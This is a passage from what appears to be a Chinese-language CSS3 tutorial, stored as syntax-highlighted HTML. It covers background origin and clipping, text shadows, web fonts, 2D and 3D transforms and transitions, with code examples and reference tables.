selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">background</span><span class=\"token punctuation\">:</span><span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>bg_flower.gif<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">background-repeat</span><span class=\"token punctuation\">:</span>no-repeat<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">background-size</span><span class=\"token punctuation\">:</span>100% 100%<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">/* 规定背景图片的定位区域 */</span>\n  <span class=\"token property\">background-origin</span><span class=\"token punctuation\">:</span>content-box<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong><code>background-clip</code> 属性</strong></p>\n<p>与<code>background-origin</code> 属性相似，规定背景颜色的绘制区域，区域划分与<code>background-origin</code> 属性相同。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span>yellow<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">background-clip</span><span class=\"token punctuation\">:</span>content-box<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>CSS3 多重背景图片</strong></p>\n<p>CSS3 允许为元素设置多个背景图像</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">body</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">background-image</span><span class=\"token punctuation\">:</span><span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>bg_flower.gif<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">,</span><span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>bg_flower_2.gif<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>CSS3 文本效果</li>\n</ol>\n<p><strong><code>text-shadow</code> 属性</strong></p>\n<p>给为本添加阴影，能够设置水平阴影、垂直阴影、模糊距离，以及阴影的颜色。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">h1</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">text-shadow</span><span class=\"token punctuation\">:</span> 5px 5px 5px #FF0000<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>text-wrap 属性</strong></p>\n<p>设置区域内的自动换行。</p>\n<p><strong>语法：</strong><code>text-wrap: normal | none | unrestricted | suppress | break-word;</code></p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 允许对长单词进行拆分，并换行到下一行 */</span>\n<span class=\"token selector\">p</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">word-wrap</span><span class=\"token punctuation\">:</span>break-word<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<table>\n<thead>\n<tr>\n<th align=\"center\">值</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">normal</td>\n<td align=\"center\">只在允许的换行点进行换行。</td>\n</tr>\n<tr>\n<td align=\"center\">none</td>\n<td align=\"center\">不换行。元素无法容纳的文本会溢出。</td>\n</tr>\n<tr>\n<td align=\"center\">break-word</td>\n<td align=\"center\">在任意两个字符间换行。</td>\n</tr>\n<tr>\n<td align=\"center\">suppress</td>\n<td align=\"center\">压缩元素中的换行。浏览器只在行中没有其他有效换行点时进行换行。</td>\n</tr>\n</tbody></table>\n<ol>\n<li>CSS3 字体</li>\n</ol>\n<p><strong>字体定义</strong></p>\n<p> 在 CSS3 之前，web 设计师必须使用已在用户计算机上安装好的字体。但是通过 CSS3，web 设计师可以使用他 们喜欢的任意字体。当找到或购买到希望使用的字体时，可将该字体文件存放到 web 服务器上，它会在需要时 被自动下载到用户的计算机上。字体需要在 CSS3 @font-face 规则中定义。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 定义字体 */</span>\n<span class=\"token atrule\"><span class=\"token rule\">@font-face</span></span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span> myFont<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">src</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string url\">'Sansation_Light.ttf'</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">,</span>\n       <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string url\">'Sansation_Light.eot'</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">/* IE9+ */</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>myFont<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>使用粗体字体</strong></p>\n<p>“Sansation_Light.ttf”文件 是定义的正常字体，”Sansation_Bold.ttf” 是另一个字体文件，它包含了 Sansation 字体的粗体字符。只要 font-family 为 “myFirstFont” 的文本需要显示为粗体，浏览器就会使用该字体。</p>\n<p>（其实没弄清楚这样处理的原因，经测试直接在html中通过 b 标签也可以实现加粗的效果）</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 定义正常字体 */</span>\n<span class=\"token atrule\"><span class=\"token rule\">@font-face</span></span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span> myFirstFont<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">src</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string url\">'/example/css3/Sansation_Light.ttf'</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">,</span>\n       <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string url\">'/example/css3/Sansation_Light.eot'</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* IE9+ */</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">/* 定义粗体时使用的字体 */</span>\n<span class=\"token atrule\"><span class=\"token rule\">@font-face</span></span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span> myFirstFont<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">src</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string url\">'/example/css3/Sansation_Bold.ttf'</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">,</span>\n       <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string url\">'/example/css3/Sansation_Bold.eot'</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* IE9+ */</span>\n  <span class=\"token comment\">/* 标识属性 */</span>\n  <span class=\"token property\">font-weight</span><span class=\"token punctuation\">:</span>bold<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>myFirstFont<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>CSS3 2D 转换</li>\n</ol>\n<p>通过 CSS3 转换，我们能够对元素进行<strong>移动、缩放、转动、拉长或拉伸</strong>，转换是使元素改变形状、尺寸和位置的一种效果。</p>\n<p><strong>translate() 方法</strong></p>\n<p>通过 translate(x , y) 方法，元素根据给定的 left（x 坐标） 和 top（y 坐标） 位置参数从其当前位置移动，x为正值向右移动，为负值向左移动；y为正值向下移动，为负值向上移动；</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">translate</span><span class=\"token punctuation\">(</span>50px<span class=\"token punctuation\">,</span>100px<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-ms-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">translate</span><span class=\"token punctuation\">(</span>50px<span class=\"token punctuation\">,</span>100px<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">/* IE 9 */</span>\n  <span class=\"token property\">-webkit-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">translate</span><span class=\"token punctuation\">(</span>50px<span class=\"token punctuation\">,</span>100px<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">/* Safari and Chrome */</span>\n  <span class=\"token property\">-o-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">translate</span><span class=\"token punctuation\">(</span>50px<span class=\"token punctuation\">,</span>100px<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">/* Opera */</span>\n  <span class=\"token property\">-moz-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">translate</span><span class=\"token punctuation\">(</span>50px<span class=\"token punctuation\">,</span>100px<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">/* Firefox */</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>rotate() 方法</strong></p>\n<p>控制元素顺时针旋转给定的角度。为正值，元素将顺时针旋转。为负值，元素将逆时针旋转。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">rotate</span><span class=\"token punctuation\">(</span>30deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-ms-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">rotate</span><span class=\"token punctuation\">(</span>30deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">/* IE 9 */</span>\n  <span class=\"token property\">-webkit-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">rotate</span><span class=\"token punctuation\">(</span>30deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">/* Safari and Chrome */</span>\n  <span class=\"token property\">-o-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">rotate</span><span class=\"token punctuation\">(</span>30deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">/* Opera */</span>\n  <span class=\"token property\">-moz-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">rotate</span><span class=\"token punctuation\">(</span>30deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">/* Firefox */</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>scale() 方法</strong></p>\n<p>根据给定的宽度（X 轴）和高度（Y 轴）参数，控制元素的尺寸的增加、减少。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">scale</span><span class=\"token punctuation\">(</span>2<span class=\"token punctuation\">,</span>4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-ms-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">scale</span><span class=\"token punctuation\">(</span>2<span class=\"token punctuation\">,</span>4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">/* IE 9 */</span>\n  <span class=\"token property\">-webkit-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">scale</span><span class=\"token punctuation\">(</span>2<span class=\"token punctuation\">,</span>4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">/* Safari 和 Chrome */</span>\n  <span class=\"token property\">-o-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">scale</span><span class=\"token punctuation\">(</span>2<span class=\"token punctuation\">,</span>4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">/* Opera */</span>\n  <span class=\"token property\">-moz-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">scale</span><span class=\"token punctuation\">(</span>2<span class=\"token punctuation\">,</span>4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">/* Firefox */</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>skew() 方法</strong></p>\n<p>根据给定的水平线（X 轴）和垂直线（Y 轴）参数设置元素翻转给定的角度。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 设置围绕 X 轴把元素翻转 30 度，围绕 Y 轴翻转 20 度。 */</span>\n<span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">skew</span><span class=\"token punctuation\">(</span>30deg<span class=\"token punctuation\">,</span>20deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-ms-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">skew</span><span class=\"token punctuation\">(</span>30deg<span class=\"token punctuation\">,</span>20deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">/* IE 9 */</span>\n  <span class=\"token property\">-webkit-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">skew</span><span class=\"token punctuation\">(</span>30deg<span class=\"token punctuation\">,</span>20deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">/* Safari and Chrome */</span>\n  <span class=\"token property\">-o-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">skew</span><span class=\"token punctuation\">(</span>30deg<span class=\"token punctuation\">,</span>20deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>          <span class=\"token comment\">/* Opera */</span>\n  <span class=\"token property\">-moz-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">skew</span><span class=\"token punctuation\">(</span>30deg<span class=\"token punctuation\">,</span>20deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">/* Firefox */</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>matrix() 方法</strong></p>\n<p>matrix() 方法把所有 2D 转换方法组合在一起。matrix() 方法需要六个参数，包含数学函数，允许旋转、缩放、移动以及倾斜元素。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 使用 matrix 方法将 div 元素旋转 30 度 */</span>\n<span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span><span class=\"token function\">matrix</span><span class=\"token punctuation\">(</span>0.866<span class=\"token punctuation\">,</span>0.5<span class=\"token punctuation\">,</span>-0.5<span class=\"token punctuation\">,</span>0.866<span class=\"token punctuation\">,</span>0<span class=\"token punctuation\">,</span>0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-ms-transform</span><span class=\"token punctuation\">:</span><span class=\"token function\">matrix</span><span class=\"token punctuation\">(</span>0.866<span class=\"token punctuation\">,</span>0.5<span class=\"token punctuation\">,</span>-0.5<span class=\"token punctuation\">,</span>0.866<span class=\"token punctuation\">,</span>0<span class=\"token punctuation\">,</span>0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>          <span class=\"token comment\">/* IE 9 */</span>\n  <span class=\"token property\">-moz-transform</span><span class=\"token punctuation\">:</span><span class=\"token function\">matrix</span><span class=\"token punctuation\">(</span>0.866<span class=\"token punctuation\">,</span>0.5<span class=\"token punctuation\">,</span>-0.5<span class=\"token punctuation\">,</span>0.866<span class=\"token punctuation\">,</span>0<span class=\"token punctuation\">,</span>0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">/* Firefox */</span>\n  <span class=\"token property\">-webkit-transform</span><span class=\"token punctuation\">:</span><span class=\"token function\">matrix</span><span class=\"token punctuation\">(</span>0.866<span class=\"token punctuation\">,</span>0.5<span class=\"token punctuation\">,</span>-0.5<span class=\"token punctuation\">,</span>0.866<span class=\"token punctuation\">,</span>0<span class=\"token punctuation\">,</span>0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">/* Safari and Chrome */</span>\n  <span class=\"token property\">-o-transform</span><span class=\"token punctuation\">:</span><span class=\"token function\">matrix</span><span class=\"token punctuation\">(</span>0.866<span class=\"token punctuation\">,</span>0.5<span class=\"token punctuation\">,</span>-0.5<span class=\"token punctuation\">,</span>0.866<span class=\"token punctuation\">,</span>0<span class=\"token punctuation\">,</span>0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">/* Opera */</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>2D Transform 方法汇总</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">函数</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">matrix(n,n,n,n,n,n)</td>\n<td align=\"center\">定义 2D 转换，使用六个值的矩阵。</td>\n</tr>\n<tr>\n<td align=\"center\">translate(x,y)</td>\n<td align=\"center\">定义 2D 转换，沿着 X 和 Y 轴移动元素。</td>\n</tr>\n<tr>\n<td align=\"center\">translateX(n)</td>\n<td align=\"center\">定义 2D 转换，沿着 X 轴移动元素。</td>\n</tr>\n<tr>\n<td align=\"center\">translateY(n)</td>\n<td align=\"center\">定义 2D 转换，沿着 Y 轴移动元素。</td>\n</tr>\n<tr>\n<td align=\"center\">scale(x,y)</td>\n<td align=\"center\">定义 2D 缩放转换，改变元素的宽度和高度。</td>\n</tr>\n<tr>\n<td align=\"center\">scaleX(n)</td>\n<td align=\"center\">定义 2D 缩放转换，改变元素的宽度。</td>\n</tr>\n<tr>\n<td align=\"center\">scaleY(n)</td>\n<td align=\"center\">定义 2D 缩放转换，改变元素的高度。</td>\n</tr>\n<tr>\n<td align=\"center\">rotate(angle)</td>\n<td align=\"center\">定义 2D 旋转，在参数中规定角度。</td>\n</tr>\n<tr>\n<td align=\"center\">skew(x-angle,y-angle)</td>\n<td align=\"center\">定义 2D 倾斜转换，沿着 X 和 Y 轴。</td>\n</tr>\n<tr>\n<td align=\"center\">skewX(angle)</td>\n<td align=\"center\">定义 2D 倾斜转换，沿着 X 轴。</td>\n</tr>\n<tr>\n<td align=\"center\">skewY(angle)</td>\n<td align=\"center\">定义 2D 倾斜转换，沿着 Y 轴。</td>\n</tr>\n</tbody></table>\n<ol>\n<li>CSS3 3D 转换</li>\n</ol>\n<p>CSS3 允许使用 3D 转换来对元素进行格式化</p>\n<p><strong>rotateX() 方法</strong></p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 设置元素围绕其 X 轴以给定的度数进行旋转 */</span>\n<span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">rotateX</span><span class=\"token punctuation\">(</span>120deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-webkit-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">rotateX</span><span class=\"token punctuation\">(</span>120deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">/* Safari 和 Chrome */</span>\n  <span class=\"token property\">-moz-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">rotateX</span><span class=\"token punctuation\">(</span>120deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">/* Firefox */</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>rotateY() 旋转</strong></p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 设置元素围绕其 Y 轴以给定的度数进行旋转 */</span>\n<span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">rotateY</span><span class=\"token punctuation\">(</span>130deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-webkit-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">rotateY</span><span class=\"token punctuation\">(</span>130deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">/* Safari 和 Chrome */</span>\n  <span class=\"token property\">-moz-transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">rotateY</span><span class=\"token punctuation\">(</span>130deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">/* Firefox */</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li><p>CSS3 过渡</p>\n<p>通过 CSS3可以在不使用 Flash 动画或 JavaScript 的情况下，当元素从一种样式变换为另一种样式时为元素添加效果。</p>\n<p>要实现这一点，必须规定以下两项内容：</p>\n<ul>\n<li>设置添加过渡效果的 CSS 属性；</li>\n<li>设置过渡效果的时长；</li>\n</ul>\n<p><strong>注意：</strong> 如果时长未设置，则不会有过渡效果，因为默认值是 0。</p>\n</li>\n</ol>\n<p><strong>单项改变</strong></p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 设置将变化效果添加在“宽度”上，时长为2秒；该时长在其他属性上并不适用 */</span>\n<span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">transition</span><span class=\"token punctuation\">:</span> width 2s<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-moz-transition</span><span class=\"token punctuation\">:</span> width 2s<span class=\"token punctuation\">;</span>         <span class=\"token comment\">/* Firefox 4 */</span>\n  <span class=\"token property\">-webkit-transition</span><span class=\"token punctuation\">:</span> width 2s<span class=\"token punctuation\">;</span>      <span class=\"token comment\">/* Safari 和 Chrome */</span>\n  <span class=\"token property\">-o-transition</span><span class=\"token punctuation\">:</span> width 2s<span class=\"token punctuation\">;</span>           <span class=\"token comment\">/* Opera */</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">/* 配合在一起使用的效果就是当鼠标移上去的时候宽度变为300px，这个过程耗时2秒 */</span>\n<span class=\"token selector\">div:hover</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">width</span><span class=\"token punctuation\">:</span>300px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p> <strong>注意：</strong> 当鼠标移出元素时，它会逐渐变回原来的样式。</p>\n<p><strong>多项改变</strong></p>\n<p>如需向多个样式添加过渡效果，请添加多个属性，由逗号隔开。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 同时向宽度、高度和转换添加过渡效果 */</span>\n<span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">transition</span><span class=\"token punctuation\">:</span> width 2s<span class=\"token punctuation\">,</span> height 2s<span class=\"token punctuation\">,</span> transform 2s<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-moz-transition</span><span class=\"token punctuation\">:</span> width 2s<span class=\"token punctuation\">,</span> height 2s<span class=\"token punctuation\">,</span> -moz-transform 2s<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-webkit-transition</span><span class=\"token punctuation\">:</span> width 2s<span class=\"token punctuation\">,</span> height 2s<span class=\"token punctuation\">,</span> -webkit-transform 2s<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-o-transition</span><span class=\"token punctuation\">:</span> width 2s<span class=\"token punctuation\">,</span> height 2s<span class=\"token punctuation\">,</span>-o-transform 2s<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">/* 当鼠标移上时宽度和高度都变成200px，同时旋转180度，每个属性变化都耗时2秒 */</span>\n<span class=\"token selector\">div:hover</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">width</span><span class=\"token punctuation\">:</span>200px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">height</span><span class=\"token punctuation\">:</span>200px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span><span class=\"token function\">rotate</span><span class=\"token punctuation\">(</span>180deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-moz-transform</span><span class=\"token punctuation\">:</span><span class=\"token function\">rotate</span><span class=\"token punctuation\">(</span>180deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">/* Firefox 4 */</span>\n  <span class=\"token property\">-webkit-transform</span><span class=\"token punctuation\">:</span><span class=\"token function\">rotate</span><span class=\"token punctuation\">(</span>180deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">/* Safari and Chrome */</span>\n  <span class=\"token property\">-o-transform</span><span class=\"token punctuation\">:</span><span class=\"token function\">rotate</span><span class=\"token punctuation\">(</span>180deg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>          <span class=\"token comment\">/* Opera */</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>过渡属性详解</strong></p>\n<p><code>transition</code> 是简写属性，</p>\n<p><strong>语法：</strong> <code>transition : transition-property | transition-duration | transition-timing-function | transition-delay;</code></p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 设置在宽度上添加过渡效果，时长为1秒，过渡效果时间曲线为linear，等待2秒后开始过渡 */</span>\n<span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">transition</span><span class=\"token punctuation\">:</span> width 1s linear 2s<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-moz-transition</span><span class=\"token punctuation\">:</span> width 1s linear 2s<span class=\"token punctuation\">;</span>       <span class=\"token comment\">/* Firefox 4 */</span>\n  <span class=\"token property\">-webkit-transition</span><span class=\"token punctuation\">:</span> width 1s linear 2s<span class=\"token punctuation\">;</span>    <span class=\"token comment\">/* Safari and Chrome */</span>\n  <span class=\"token property\">-o-transition</span><span class=\"token punctuation\">:</span> width 1s linear 2s<span class=\"token punctuation\">;</span>         <span class=\"token comment\">/* Opera */</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<table>\n<thead>\n<tr>\n<th align=\"center\">属性</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">transition</td>\n<td align=\"center\">简写属性，用于在一个属性中设置四个过渡属性。</td>\n</tr>\n<tr>\n<td 